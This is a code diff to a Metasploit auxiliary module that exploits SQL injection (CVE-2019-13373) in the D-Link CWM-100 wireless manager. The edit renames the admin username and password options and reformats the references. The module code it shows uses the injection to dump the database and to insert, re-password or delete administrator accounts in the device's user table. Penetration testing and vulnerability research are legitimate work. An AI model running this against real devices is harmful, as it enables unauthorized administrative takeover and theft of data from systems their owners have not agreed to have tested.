@@ -30,10 +30,11 @@ class MetasploitModule < Msf::Auxiliary
             'M3@ZionLab from DBAppSecurity',
             'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # Metasploit module
           ],
-        'References' => [
-          ['CVE', '2019-13373'],
-          ['URL', 'https://unh3x.github.io/2019/02/21/D-link-(CWM-100)-Multiple-Vulnerabilities/']
-        ],
+        'References' =>
+          [
+            ['CVE', '2019-13373'],
+            ['URL', 'https://unh3x.github.io/2019/02/21/D-link-(CWM-100)-Multiple-Vulnerabilities/']
+          ],
         'Actions' =>
           [
             [ 'SQLI_DUMP', 'Description' => 'Retrieve all the data from the database' ],
@@ -50,8 +51,8 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(443),
         OptString.new('TARGETURI', [true, 'The base path to DLink CWM-100', '/']),
-        OptString.new('Admin_Username', [false, 'The username of the user to add/remove']),
-        OptString.new('Admin_Password', [false, 'The password of the user to add/edit'])
+        OptString.new('USERNAME', [false, 'The username of the user to add/remove']),
+        OptString.new('PASSWORD', [false, 'The password of the user to add/edit'])
       ]
     )
   end
@@ -126,32 +127,32 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check_admin_username
-    if datastore['Admin_Username'].nil?
+    if datastore['USERNAME'].nil?
       fail_with Failure::BadConfig, 'You must specify a username when adding a user'
-    elsif ['\\', '\''].any? { |c| datastore['Admin_Username'].include?(c) }
+    elsif ['\\', '\''].any? { |c| datastore['USERNAME'].include?(c) }
       fail_with Failure::BadConfig, 'Admin username cannot contain single quotes or backslashes'
     end
   end
 
   def add_user(sqli)
     check_admin_username
-    admin_hash = Digest::MD5.hexdigest(datastore['Admin_Password'] || '')
-    user_exists_sql = "select count(1) from usertable where username='#{datastore['Admin_Username']}'"
+    admin_hash = Digest::MD5.hexdigest(datastore['PASSWORD'] || '')
+    user_exists_sql = "select count(1) from usertable where username='#{datastore['USERNAME']}'"
     # check if user exists, if yes, just change his password
     if sqli.run_sql(user_exists_sql).to_i == 0
       print_status 'User not found on the target, inserting'
       sqli.run_sql('insert into usertable(username,userpassword,level) values(' \
-      "'#{datastore['Admin_Username']}', '#{admin_hash}', 1)")
+      "'#{datastore['USERNAME']}', '#{admin_hash}', 1)")
     else
       print_status 'User already exists, updating the password'
       sqli.run_sql("update usertable set userpassword='#{admin_hash}' where " \
-      "username='#{datastore['Admin_Username']}'")
+      "username='#{datastore['USERNAME']}'")
     end
   end
 
   def remove_user(sqli)
     check_admin_username
-    sqli.run_sql("delete from usertable where username='#{datastore['Admin_Username']}'")
+    sqli.run_sql("delete from usertable where username='#{datastore['USERNAME']}'")
   end
 
   def run
